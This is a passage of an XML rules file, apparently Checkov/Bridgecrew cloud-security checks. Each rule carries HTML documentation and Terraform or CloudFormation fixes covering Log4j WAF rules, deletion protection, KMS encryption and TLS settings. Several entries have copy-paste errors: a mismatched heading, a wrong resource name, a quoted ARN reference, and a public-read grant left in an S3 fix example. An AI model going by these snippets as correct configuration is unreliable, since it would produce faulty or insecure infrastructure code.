      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="front-door-waf-allows-message-lookup-in-log4j2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-front-door-waf-allows-message-lookup-in-log-4-j-2"></div>Front Door WAF allows message lookup in Log4j2</div><a aria-label="Skip link to Front Door WAF allows message lookup in Log4j2" class="heading-anchor-icon fa fa-anchor" href="#front-door-waf-allows-message-lookup-in-log4j2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.<br/>
Set your Front Door Web Application Firewall (WAF) to prevent executing such mechanism using the rule definition below.</p>
<p>Azure WAF has updated Default Rule Set (DRS) versions 1.0 and 1.1 with rule 944240 &#8220;Remote Command Execution&#8221; under Managed Rules to help in detecting and mitigating this vulnerability. This rule is already enabled by default in block mode for all existing WAF Default Rule Set configurations.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_self">CVE-2021-44228</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_frontdoor_firewall_policy</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_frontdoor_firewall_policy" "example" {
  name                = "example"
  resource_group_name = "example"

  managed_rule {
    type    = "Microsoft_DefaultRuleSet"
    version = "1.1"

    override {
      rule_group_name = "JAVA"

      rule {
        action  = "Block"
        enabled = true
        rule_id = "944240"
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-front-door-waf-prevents-message-lookup-in-log4j2' target='_blank'> https://docs.bridgecrew.io/docs/ensure-front-door-waf-prevents-message-lookup-in-log4j2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-front-door-waf-prevents-message-lookup-in-log4j2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_135</key>
    <name>Ensure Application Gateway WAF prevents message lookup in Log4j2</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="application-gateway-waf-allows-message-lookup-in-log4j2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-application-gateway-waf-allows-message-lookup-in-log-4-j-2"></div>Application Gateway WAF allows message lookup in Log4j2</div><a aria-label="Skip link to Application Gateway WAF allows message lookup in Log4j2" class="heading-anchor-icon fa fa-anchor" href="#application-gateway-waf-allows-message-lookup-in-log4j2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.<br/>
Set your Application Gateway (WAF) to prevent executing such mechanism using the rule definition below.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_self">CVE-2021-44228</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_frontdoor_firewall_policy</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_web_application_firewall_policy" "example" {
  location            = "germanywestcentral"
  name                = "example"
  resource_group_name = "example"

  managed_rules {
    managed_rule_set {
      type    = "OWASP"
      version = "3.1"
    }
  }

  policy_settings {}
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-application-gateway-waf-prevents-message-lookup-in-log4j2' target='_blank'> https://docs.bridgecrew.io/docs/ensure-application-gateway-waf-prevents-message-lookup-in-log4j2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-application-gateway-waf-prevents-message-lookup-in-log4j2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_73</key>
    <name>Ensure Cloud Armor prevents message lookup in Log4j2</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="front-door-waf-allows-message-lookup-in-log4j2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-front-door-waf-allows-message-lookup-in-log-4-j-2"></div>Front Door WAF allows message lookup in Log4j2</div><a aria-label="Skip link to Front Door WAF allows message lookup in Log4j2" class="heading-anchor-icon fa fa-anchor" href="#front-door-waf-allows-message-lookup-in-log4j2"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.<br/>
Set your Cloud Armor to prevent executing such mechanism using the rule definition below.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_self">CVE-2021-44228</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_compute_security_policy</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_security_policy" "example" {
  name = "example"

  rule {
    action   = "deny(403)"
    priority = 1
    match {
      expr {
        expression = "evaluatePreconfiguredExpr('cve-canary')"
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-cloud-armor-prevents-message-lookup-in-log4j2' target='_blank'> https://docs.bridgecrew.io/docs/ensure-cloud-armor-prevents-message-lookup-in-log4j2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-cloud-armor-prevents-message-lookup-in-log4j2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_150</key>
    <name>Ensure load balancer has deletion protection enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="deletion-protection-disabled-for-load-balancer"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-deletion-protection-disabled-for-load-balancer"></div>Deletion protection disabled for load balancer</div><a aria-label="Skip link to Deletion protection disabled for load balancer" class="heading-anchor-icon fa fa-anchor" href="#deletion-protection-disabled-for-load-balancer"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic Load Balancers v2 (ELBv2) which are configured with deletion protection feature disabled. Enabling delete protection for these ELBs prevents irreversible data loss resulting from accidental or malicious operations.<br/>
For more details refer: <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#deletion-protection" target="_self">https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#deletion-protection</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS console</li>
<li>In the console, select the specific region from the region drop-down on the top right corner, for which the alert is generated</li>
<li>Go to the EC2 Dashboard, and select 'Load Balancers'</li>
<li>Click on the reported Load Balancer</li>
<li>On the Description tab, choose 'Edit attributes'</li>
<li>On the Edit load balancer attributes page, select 'Enable' for 'Delete Protection'</li>
<li>Click on 'Save' to save your changes</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lb</li>
<li><strong>Argument:</strong> enable_deletion_protection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lb" "test_success" {
  ...
+ enable_deletion_protection = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_networking_62' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_networking_62</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_networking_62' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_172</key>
    <name>Ensure QLDB ledger has deletion protection enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-qldb-ledger-has-deletion-protection-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-qldb-ledger-has-deletion-protection-enabled"></div>Ensure QLDB ledger has deletion protection enabled</div><a aria-label="Skip link to Ensure QLDB ledger has deletion protection enabled" class="heading-anchor-icon fa fa-anchor" href="#ensure-qldb-ledger-has-deletion-protection-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Quantum Ledger Database (Amazon QLDB) is a fully managed ledger database for cryptographically verifiable transaction logging. You can use the QLDB API or the AWS Command Line Interface (AWS CLI) to create, update, and delete ledgers in Amazon QLDB. You can also list all the ledgers in your account, or get information about a specific ledger.</p>
<p>Deletion protection is enabled by default. To successfully delete this resource via Terraform, deletion_protection = false must be applied before attempting deletion. In CloudFormation the flag that prevents a ledger from being deleted by any user. If not provided on ledger creation, this feature is enabled (true) by default.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_qldb_ledger</li>
<li><strong>Argument</strong>:  deletion_protection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_qldb_ledger" "sample-ledger" {
  name             = "sample-ledger"
  permissions_mode = "STANDARD"
+ deletion_protection = true 
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::QLDB::Ledger</li>
<li><strong>Argument</strong>:  DeletionProtection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::QLDB::Ledger
Properties: 
+  DeletionProtection: true
  KmsKey: String
  Name: String
  PermissionsMode: String
  Tags: 
    - Tag
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_storage_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_storage_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_storage_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_173</key>
    <name>Check encryption settings for Lambda environmental variable</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="encryption-settings-for-lambda-environmental-variable-is-not-set-properly"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-encryption-settings-for-lambda-environmental-variable-is-not-set-properly"></div>Encryption settings for Lambda environmental variable is not set properly</div><a aria-label="Skip link to Encryption settings for Lambda environmental variable is not set properly" class="heading-anchor-icon fa fa-anchor" href="#encryption-settings-for-lambda-environmental-variable-is-not-set-properly"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>You can use environment variables to adjust your function's behavior without updating code. An environment variable is a pair of strings that is stored in a function's version-specific configuration. The Lambda runtime makes environment variables available to your code and sets additional environment variables that contain information about the function and invocation request. Environment variables are not evaluated prior to the function invocation. Any value you define is considered a literal string and not expanded. Perform the variable evaluation in your function code.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>aws_lambda_function</p>
<ul>
<li><strong>Resource</strong>: aws_lambda_function</li>
<li><strong>Argument</strong>: kms_key_arn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lambda_function" "test_lambda" {
  filename      = "lambda_function_payload.zip"
  function_name = "lambda_function_name"
  role          = aws_iam_role.iam_for_lambda.arn
  handler       = "index.test"

  # The filebase64sha256() function is available in Terraform 0.11.12 and later
  # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:
  # source_code_hash = "${base64sha256(file("lambda_function_payload.zip"))}"
  source_code_hash = filebase64sha256("lambda_function_payload.zip")

  runtime = "nodejs12.x"
  
+ kms_key_arn = "ckv_km"
  
  environment {
    variables = {
      foo = "bar"
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_serverless_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_serverless_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_serverless_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_174</key>
    <name>Verify CloudFront Distribution Viewer Certificate is using TLS v1.2</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudfront-web-distribution-that-allow-tls-versions-10-or-lower"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-front-web-distribution-that-allow-tls-versions-1-0-or-lower"></div>CloudFront web distribution that allow TLS versions 1.0 or lower</div><a aria-label="Skip link to CloudFront web distribution that allow TLS versions 1.0 or lower" class="heading-anchor-icon fa fa-anchor" href="#cloudfront-web-distribution-that-allow-tls-versions-10-or-lower"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies AWS CloudFront web distributions which are configured with TLS versions for HTTPS communication between viewers and CloudFront. As a best practice, use TLSv1.1_2016 or later as the minimum protocol version in your CloudFront distribution security policies</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Sign in to the AWS console</li>
<li>Navigate to CloudFront Distributions Dashboard</li>
<li>Click on the reported distribution</li>
<li>On 'General' tab, Click on 'Edit' button</li>
<li>On 'Edit Distribution' page, Set 'Security Policy' to TLSv1.1_2016 or later as per your requirement.</li>
<li>Click on 'Yes, Edit'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_cloudfront_distribution</li>
<li><strong>Argument</strong>: minimum_protocol_version</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudfront_distribution" "pass" {
...

  viewer_certificate {
    cloudfront_default_certificate = false
    minimum_protocol_version = "TLSv1.2_2018"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_networking_63' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_networking_63</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_networking_63' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_181</key>
    <name>Ensure S3 Object Copy is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-s3-object-copy-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-s-3-object-copy-not-encrypted-using-customer-managed-key"></div>AWS S3 Object Copy not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS S3 Object Copy not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-s3-object-copy-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that the S3 Object Copy is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: aws_s3_object_copy</li>
<li>Attribute: kms_key_id - (Optional) Specifies the AWS KMS Key ARN to use for object encryption. This value is a fully qualified ARN of the KMS Key. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_object_copy" "test" {
  bucket = "destination_bucket"
  key    = "destination_key"
  source = "source_bucket/source_key"
+ kms_key_id = "aws_kms_key.foo.arn"


  grant {
    uri         = "http://acs.amazonaws.com/groups/global/AllUsers"
    type        = "Group"
    permissions = ["READ"]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_101' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_101</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_101' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_187</key>
    <name>Ensure Sagemaker domain is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-sagemaker-domain-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-sagemaker-domain-not-encrypted-using-customer-managed-key"></div>AWS Sagemaker domain not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS Sagemaker domain not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-sagemaker-domain-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon SageMaker Feature Store enables you to create two types of stores: an online store or offline store. The online store is used for low latency real-time inference use cases whereas the offline store is used for training and batch inference use cases. When you create a feature group for online or offline use you can provide a AWS Key Management Service customer managed key to encrypt all your data at rest. In case you do not provide a AWS KMS key then we ensure that your data is encrypted on the server side using an AWS owned AWS KMS key or AWS managed AWS KMS key.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sagemaker_domain</li>
<li><strong>Argument</strong>: kms_key_id - (Optional) The AWS KMS customer managed CMK used to encrypt the EFS volume attached to the domain.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_sagemaker_domain" "example" {
  domain_name = "example"
  auth_mode   = "IAM"
  vpc_id      = aws_vpc.test.id
  subnet_ids  = [aws_subnet.test.id]
  + kms_key_id = "ckv_kms"
  default_user_settings {
    execution_role = aws_iam_role.test.arn
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_107' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_107</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_107' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_126</key>
    <name>Ensure that Service Fabric uses available three levels of protection available</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="service-fabric-does-not-use-three-levels-of-protection-available"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-service-fabric-does-not-use-three-levels-of-protection-available"></div>Service Fabric does not use three levels of protection available</div><a aria-label="Skip link to Service Fabric does not use three levels of protection available" class="heading-anchor-icon fa fa-anchor" href="#service-fabric-does-not-use-three-levels-of-protection-available"></a></h1>
